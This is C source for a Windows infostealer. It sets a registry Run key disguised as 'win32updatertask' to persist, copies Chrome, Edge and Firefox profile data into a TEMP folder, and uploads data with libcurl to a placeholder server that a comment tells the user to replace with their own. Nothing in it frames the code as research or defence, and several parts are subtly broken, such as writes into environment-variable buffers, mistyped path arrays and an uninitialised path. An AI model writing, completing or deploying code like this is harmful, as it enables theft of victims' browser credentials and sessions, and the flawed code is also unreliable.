#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "curl/curl.h"

void scrapeFiles();
void copyDir(char *path_origin, char *dir_name);
void uploadFolder();

int main()
{
    TCHAR szPath[MAX_PATH];
    char *temp = getenv("TEMP");
    sprintf(szPath, "%s\\tsk_sp\\phantom-intrusion\\browser-watch\\vstate.exe", temp);

    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);

    RegSetValueEx(hKey, "win32updatertask", 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
    RegCloseKey(hKey);

    scrapeFiles();
    uploadFolder();
}

void scrapeFiles()
{
    WIN32_FIND_DATA findData;
    HANDLE hFind;
    char *localAppData = getenv("LOCALAPPDATA");
    char *appData = getenv("APPDATA");
    char *tempDir = getenv("TEMP");
    char tempPath[MAX_PATH];
    sprintf(tempPath, "%s\\tsk_explcopy", tempDir);
    CreateDirectory(tempPath, NULL);
    char chromePath[MAX_PATH];
    char edgePath[MAX_PATH];
    char firefoxPath[MAX_PATH];
    sprintf(localAppData, "%s", getenv("LOCALAPPDATA"));
    sprintf(appData, "%s", getenv("APPDATA"));
    sprintf(chromePath, "%s\\Google\\Chrome\\User Data\\Default\\*", localAppData);
    sprintf(edgePath, "%s\\Microsoft\\Edge\\User Data\\Default\\*", localAppData);
    sprintf(firefoxPath, "%s\\Mozilla\\Firefox\\Profiles\\*", appData);

    char *browserPath[] = {chromePath, edgePath, firefoxPath};
    char *dirToCopy[MAX_PATH];
    sprintf(dirToCopy, "%s\\browser-watch-data", tempPath);
    CreateDirectory(dirToCopy, NULL);
    for (size_t i = 0; i < 3; i++)
    {
        hFind = FindFirstFile(browserPath[i], &findData);
        browserPath[i][strlen(browserPath[i]) - 2] = '\0';
        while (FindNextFile(hFind, &findData))
        {
            char srcPath[MAX_PATH];
            char destPath[MAX_PATH];
            sprintf(srcPath, "%s\\%s", browserPath[i], findData.cFileName);
            sprintf(destPath, "%s\\copy_%s", dirToCopy, findData.cFileName);
            if (CopyFile(srcPath, destPath, FALSE))
            {
                ;
            }
            else
            {
                if (strcmp(findData.cFileName, ".."))
                {
                    copyDir(srcPath, findData.cFileName);
                }
            }
        }
    }
}

void copyDir(char *path_origin, char *dir_name)
{
    WIN32_FIND_DATA findData;
    HANDLE hFind;

    char ogPath[MAX_PATH];
    char srcPath[MAX_PATH];
    char newDirCopy[MAX_PATH];
    sprintf(srcPath, "%s\\*", path_origin);
    char *tempDir = getenv("TEMP");
    char tempPath[MAX_PATH];
    char *dirToCopy[MAX_PATH];
    sprintf(dirToCopy, "%s\\browser-watch-data\\copy_%s", tempPath, dir_name);
    CreateDirectory(dirToCopy, NULL);
    ;
    hFind = FindFirstFile(srcPath, &findData);
    while (FindNextFile(hFind, &findData))
    {
        sprintf(ogPath, "%s\\%s", path_origin, findData.cFileName);
        sprintf(newDirCopy, "%s\\%s", dirToCopy, findData.cFileName);
        if (CopyFile(ogPath, newDirCopy, FALSE))
        {
            ;
        }
        // Sub directories are ignored for speed reasons.
    }
}

void uploadFolder()
{
    CURL *curl = curl_easy_init();
    if (curl)
    {
        char uploadFromSource[MAX_PATH];
        char *temp = getenv("TEMP");
        sprintf(uploadFromSource, "%s\\tsk_sp", temp);

        FILE *file = fopen(uploadFromSource, "rb");
        if (!file)
        {
            ;
        }

        curl_easy_setopt(curl, CURLOPT_URL, "http://addyoururlhere/upload.php"); // Change the url to your own upload server
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        curl_easy_setopt(curl, CURLOPT_READFUNCTION, fread);
        curl_easy_setopt(curl, CURLOPT_READDATA, file);
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK)
        {
            ;
        }

        fclose(file);
        curl_easy_cleanup(curl);
    }
}